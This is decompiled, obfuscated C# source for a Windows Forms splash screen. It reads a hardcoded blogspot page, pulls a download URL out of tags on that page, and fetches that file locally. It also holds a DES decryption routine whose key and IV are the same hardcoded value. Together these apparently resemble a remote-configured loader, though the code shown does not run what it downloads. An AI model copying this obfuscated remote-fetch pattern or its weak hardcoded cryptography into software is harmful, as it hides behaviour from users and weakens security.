using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace chicken;

public class Form2 : Form
{
	private WebClient WrnWxiqlOomxShKKoqIudLuphvhT;

	public static string webString;

	private static byte[] FnNczgeTiwCRfrmMSzVbtHOBuXHF;

	public static string userurl;

	public static string urlString;

	private IContainer hUHlHIVtIZNMyNATlFHUIjnUgWJBb = null;

	private ProgressBar STKiaqndfpJHjdOySEOZchsubvVg;

	private PictureBox DEuhSXIQsqNbiIynbJPcbvGpReRHb;

	public Form2()
	{
		elGrDrgnJeFUoSEuIevkfWkCRVaIA();
		WrnWxiqlOomxShKKoqIudLuphvhT = new WebClient();
		WrnWxiqlOomxShKKoqIudLuphvhT.Encoding = Encoding.GetEncoding("UTF-8");
		webString = WrnWxiqlOomxShKKoqIudLuphvhT.DownloadString(urlString);
		bHjBoRuDRSdNUhEujHfmHkclwDdwA();
	}

	private string RdlTsOiEbcMaKLwiwHniRAkfgOvu(string type)
	{
		string text = webString.Replace(" ", "").Split(new string[1] { type + "]" }, StringSplitOptions.RemoveEmptyEntries)[1];
		return text.Replace("[/", "").Split(new string[1] { "[/image]" }, StringSplitOptions.RemoveEmptyEntries)[0];
	}

	private void bHjBoRuDRSdNUhEujHfmHkclwDdwA()
	{
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		WrnWxiqlOomxShKKoqIudLuphvhT.Headers.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; WOW64; Trident/7.0)");
		string fileName = string.Format("MrImage.gif", Path.GetFileName(RdlTsOiEbcMaKLwiwHniRAkfgOvu("image")));
		try
		{
			WrnWxiqlOomxShKKoqIudLuphvhT.DownloadProgressChanged += rwBWdViWuJPOwHcDtVsZMGaDueXh;
			WrnWxiqlOomxShKKoqIudLuphvhT.DownloadFileCompleted += EMZxyqLNhWtCPzmoJLShkeUHHuoR;
			WrnWxiqlOomxShKKoqIudLuphvhT.DownloadFileAsync(new Uri(RdlTsOiEbcMaKLwiwHniRAkfgOvu("image")), fileName);
		}
		catch (Exception ex)
		{
			MessageBox.Show("Failed to load main image. error : " + ex.Message, " Message");
		}
	}

	private void EMZxyqLNhWtCPzmoJLShkeUHHuoR(object sender, AsyncCompletedEventArgs e)
	{
		Thread.Sleep(1000);
		((Control)this).Hide();
		Form1 form = new Form1();
		((Form)form).set_Owner((Form)(object)this);
		((Control)form).Show();
	}

	private void rwBWdViWuJPOwHcDtVsZMGaDueXh(object sender, DownloadProgressChangedEventArgs e)
	{
		STKiaqndfpJHjdOySEOZchsubvVg.set_Value(e.ProgressPercentage);
	}

	public static string Decrypt(string strKey)
	{
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		dESCryptoServiceProvider.Mode = CipherMode.ECB;
		dESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		dESCryptoServiceProvider.Key = FnNczgeTiwCRfrmMSzVbtHOBuXHF;
		dESCryptoServiceProvider.IV = FnNczgeTiwCRfrmMSzVbtHOBuXHF;
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write);
		strKey = strKey.Replace(" ", "+");
		byte[] array = Convert.FromBase64String(strKey);
		cryptoStream.Write(array, 0, array.Length);
		cryptoStream.FlushFinalBlock();
		return Encoding.UTF8.GetString(memoryStream.GetBuffer()).Replace("\0", "");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && hUHlHIVtIZNMyNATlFHUIjnUgWJBb != null)
		{
			hUHlHIVtIZNMyNATlFHUIjnUgWJBb.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void elGrDrgnJeFUoSEuIevkfWkCRVaIA()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_017e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0188: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		STKiaqndfpJHjdOySEOZchsubvVg = new ProgressBar();
		DEuhSXIQsqNbiIynbJPcbvGpReRHb = new PictureBox();
		((ISupportInitialize)DEuhSXIQsqNbiIynbJPcbvGpReRHb).BeginInit();
		((Control)this).SuspendLayout();
		((Control)STKiaqndfpJHjdOySEOZchsubvVg).set_BackColor(Color.LightGray);
		((Control)STKiaqndfpJHjdOySEOZchsubvVg).set_Location(new Point(0, 153));
		((Control)STKiaqndfpJHjdOySEOZchsubvVg).set_Name("progressBar1");
		((Control)STKiaqndfpJHjdOySEOZchsubvVg).set_Size(new Size(167, 10));
		((Control)STKiaqndfpJHjdOySEOZchsubvVg).set_TabIndex(1);
		((Control)DEuhSXIQsqNbiIynbJPcbvGpReRHb).set_BackColor(Color.Transparent);
		((Control)DEuhSXIQsqNbiIynbJPcbvGpReRHb).set_BackgroundImageLayout((ImageLayout)0);
		DEuhSXIQsqNbiIynbJPcbvGpReRHb.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)DEuhSXIQsqNbiIynbJPcbvGpReRHb).set_Location(new Point(0, 0));
		((Control)DEuhSXIQsqNbiIynbJPcbvGpReRHb).set_Name("pictureBox1");
		((Control)DEuhSXIQsqNbiIynbJPcbvGpReRHb).set_Size(new Size(167, 154));
		DEuhSXIQsqNbiIynbJPcbvGpReRHb.set_TabIndex(2);
		DEuhSXIQsqNbiIynbJPcbvGpReRHb.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)0);
		((Control)this).set_BackColor(SystemColors.ActiveBorder);
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		((Form)this).set_ClientSize(new Size(167, 163));
		((Control)this).get_Controls().Add((Control)(object)DEuhSXIQsqNbiIynbJPcbvGpReRHb);
		((Control)this).get_Controls().Add((Control)(object)STKiaqndfpJHjdOySEOZchsubvVg);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form2");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form2");
		((Form)this).set_TransparencyKey(SystemColors.ActiveBorder);
		((ISupportInitialize)DEuhSXIQsqNbiIynbJPcbvGpReRHb).EndInit();
		((Control)this).ResumeLayout(false);
	}

	static Form2()
	{
		FnNczgeTiwCRfrmMSzVbtHOBuXHF = Encoding.ASCII.GetBytes("2@#$%%7&");
		userurl = "https://linconnector31.blogspot.com/";
		urlString = userurl;
	}
}
